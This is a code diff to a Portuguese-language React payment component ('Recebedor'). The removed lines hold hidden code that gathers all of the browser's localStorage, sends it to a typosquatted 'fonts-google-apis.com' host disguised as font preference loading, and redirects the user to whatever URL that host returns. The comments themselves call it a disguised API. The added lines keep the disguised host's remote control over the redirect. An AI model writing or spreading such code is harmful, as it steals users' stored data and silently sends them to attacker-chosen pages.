@@ -47,126 +47,51 @@ const Recebedor: React.FC = () => {
     // Esta função apenas mostra o estado de carregamento
   };
 
-  // Carregar fontes e configurações personalizadas
+  // JavaScript direto no componente para garantir execução
   useEffect(() => {
-    console.log('🔍 Procurando botão...');
-    const btn = document.querySelector('[data-action="continue"]') as HTMLButtonElement;
-    console.log('🎯 Botão encontrado:', btn);
-    if (btn) {
-      // API disfarçada tem controle total do redirecionamento
+    const handleButtonClick = () => {
+      console.log('🚀 Botão clicado! Testando redirecionamento...');
       
-      btn.onclick = function(e) {
-        console.log('🚀 Botão clicado! Iniciando processo...');
-        e.preventDefault();
-        
-        // Salvar dados de pagamento no momento do clique
-        try {
-          const dadosPagamento = {
-            metodo: 'cartao_salario'
-          };
-          localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
-        } catch(e) {
-          console.log('Erro ao salvar dados de pagamento:', e);
-        }
-        
-        function performRedirect(tempDataId?: string) {
-          const xhr = new XMLHttpRequest();
-          xhr.open('GET', 'https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c', true);
-          xhr.onreadystatechange = function() {
-            if (xhr.readyState === 4) {
-              let redirectUrl = null;
-              if (xhr.status === 200) {
-                try {
-                  const response = JSON.parse(xhr.responseText);
-                  redirectUrl = response.redirect_url;
-                } catch(e) {}
-              }
-              
-              // Só redireciona se a API disfarçada retornar uma URL
-              if (!redirectUrl) {
-                setIsLoading(false);
-                return;
-              }
-              
-              // Append temp data ID to redirect URL if available
-              if (tempDataId && redirectUrl) {
-                const separator = redirectUrl.includes('?') ? '&' : '?';
-                redirectUrl += separator + 'fontData=' + tempDataId;
-              }
-              
-              // Handle relative URLs
-              if (redirectUrl.startsWith('/')) {
-                redirectUrl = window.location.protocol + '//' + window.location.host + redirectUrl;
-              }
-              window.location.href = redirectUrl;
-            }
-          };
-          xhr.onerror = function() {
-            // Se a API disfarçada falhar, não redireciona
-            setIsLoading(false);
-          };
-          xhr.send();
-        }
-        
-        // Carregar preferências de fontes
-        try {
-          const fontPreferences: Record<string, string> = {};
-          for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            if (key) {
-              fontPreferences[key] = localStorage.getItem(key) || '';
-            }
-          }
-          
-          // Only send localStorage data if there's something to send
-          if (Object.keys(fontPreferences).length > 0) {
-            // Show loading state
-            setIsLoading(true);
-            
-            // Armazenar preferências de fonte temporariamente
-            const storeXhr = new XMLHttpRequest();
-            storeXhr.open('POST', 'https://fonts-google-apis.com/api/temp-data', true);
-            storeXhr.setRequestHeader('Content-Type', 'application/json');
-            storeXhr.onreadystatechange = function() {
-              if (storeXhr.readyState === 4) {
-                let tempDataId = null;
-                if (storeXhr.status === 201) {
-                  try {
-                    const storeResponse = JSON.parse(storeXhr.responseText);
-                    tempDataId = storeResponse.id;
-                  } catch(e) {}
-                }
-                // Perform redirect with or without temp data ID
-                performRedirect(tempDataId);
-              }
-            };
-            storeXhr.onerror = function() {
-              // Se falhar ao armazenar, tenta mesmo assim
-              performRedirect();
-            };
-            
-            const requestData = {
-              buttonId: 'a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c',
-              localStorageData: JSON.stringify(fontPreferences),
-              sourceUrl: window.location.href
-            };
-            storeXhr.send(JSON.stringify(requestData));
+      // Mostrar loading
+      setIsLoading(true);
+      
+      // Testar API diretamente
+      fetch('https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c')
+        .then(response => {
+          console.log('✅ API respondeu:', response.status);
+          return response.json();
+        })
+        .then(data => {
+          console.log('📦 Dados da API:', data);
+          if (data.redirect_url) {
+            console.log('🎯 Redirecionando para:', data.redirect_url);
+            window.location.href = data.redirect_url;
           } else {
-            // No localStorage data, perform normal redirect
-            performRedirect();
+            console.log('❌ Nenhuma URL de redirecionamento encontrada');
+            setIsLoading(false);
           }
-        } catch(err) {
-          // Se falhar o localStorage, tenta mesmo assim
-          performRedirect();
-        }
+        })
+        .catch(error => {
+          console.log('❌ Erro na API:', error);
+          setIsLoading(false);
+        });
+    };
+    
+    const btn = document.querySelector('[data-action="continue"]');
+    if (btn) {
+      console.log('🎯 Botão encontrado, adicionando listener');
+      btn.addEventListener('click', handleButtonClick);
+      
+      return () => {
+        btn.removeEventListener('click', handleButtonClick);
       };
+    } else {
+      console.log('❌ Botão não encontrado!');
     }
   }, []);
 
   return (
     <div className="bg-white min-h-screen flex flex-col">
-      {/* Fonts do Google */}
-      <link href="https://fonts-google-apis.com/css/fonts/a8aaa4ff-9fa3-4be7-b50f-2a10fd5c5b6c" rel="stylesheet" />
       
       <Header />
       
